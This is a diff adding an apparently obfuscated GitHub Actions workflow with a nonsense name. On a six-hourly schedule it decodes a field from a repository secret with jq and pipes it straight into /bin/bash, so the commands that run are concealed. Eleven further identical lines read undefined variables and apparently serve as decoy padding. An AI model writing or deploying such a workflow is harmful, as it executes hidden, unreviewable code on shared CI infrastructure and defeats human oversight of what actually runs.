@@ -1,0 +1,30 @@
+name: fanxiaoshibeixiayaoleyingg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanxiaoshibeixiayaoleyingg
+        env:
+          lgvz304: ${{ secrets.lgvz304 }}
+        run: |
+          echo $lgvz304 | jq -r .idff2 | /bin/bash
+          echo $hjovw23 | jq -r .cg42 | /bin/bash
+          echo $ojfj1044 | jq -r .alcov15 | /bin/bash
+          echo $obzct89476 | jq -r .pi6085 | /bin/bash
+          echo $d1023 | jq -r .t876 | /bin/bash
+          echo $ifpvg2 | jq -r .xbfb7 | /bin/bash
+          echo $jmbyt98 | jq -r .ktccx63 | /bin/bash
+          echo $uoxhf39888 | jq -r .mm32 | /bin/bash
+          echo $ko84 | jq -r .z9 | /bin/bash
+          echo $ws70 | jq -r .jtj70553 | /bin/bash
+          echo $fkgr88106 | jq -r .ykm1 | /bin/bash
+          echo $cp66 | jq -r .u0750 | /bin/bash
+
